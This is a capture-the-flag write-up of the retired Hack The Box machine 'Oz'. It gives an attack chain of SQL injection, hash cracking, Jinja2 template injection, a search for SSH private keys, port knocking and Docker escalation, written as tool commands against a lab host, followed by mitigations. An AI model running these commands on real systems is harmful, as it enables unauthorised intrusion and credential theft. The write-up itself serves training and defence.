---
machine: Oz
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, sqli, ssti, docker, port-knocking]
---

# Oz — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SQLi and password cracking open a ticketing application. Jinja2 SSTI yields a container shell. The SSH key is read through a path mounted by the database container and port knocking reaches the host, where Docker/Portainer escalates.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
sqlmap --url "http://oz.htb/tickets.php?id=1" --batch --dump
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# SSTI
curl -s "http://oz.htb/search?name={{7*7}}"
# SSH key in volume
find / -name id_rsa 2>/dev/null
# Port knocking
knock <IP> 40809 50212 46969
ssh -i id_rsa <USER>@<IP>
# Docker
docker -H tcp://127.0.0.1:2375 ps
```

## Enumeration

- Ticketing application with SQLi and weak user hashes.
- Jinja2-rendered parameters inside a container.
- Filtered host ports and an internal Docker/Portainer service.

## Initial access

SQLi in ticket search leaks hashes; crack them and log into the application. A template or name field is rendered with Jinja2 and allows command execution in the container.

## Privilege escalation

The database container mounts a host path with a user SSH key. Read the key and use port knocking to open SSH; once on the host, a poorly protected Docker/Portainer mounts `/` and runs as root.

## Evidence

- Cracked hashes and ticket access.
- SSTI with container shell.
- SSH key, knock sequence and privileged container.

## Lessons learned

- SSTI in a container is not the end of the chain.
- Docker volumes expose host paths.
- Port knocking does not replace authentication.

## Mitigation and detection

- Parameterize SQL and do not render user input as templates.
- Review volumes and Docker permissions.
- Protect Portainer and restrict the Docker socket.

## References

- [0xdf — Oz](https://0xdf.gitlab.io/2019/01/12/htb-oz.html)
- [Port knocking — knockd](https://manpages.debian.org/testing/knockd/knockd.8.en.html)
- [Hack The Box — Oz](https://app.hackthebox.com/machines/oz)
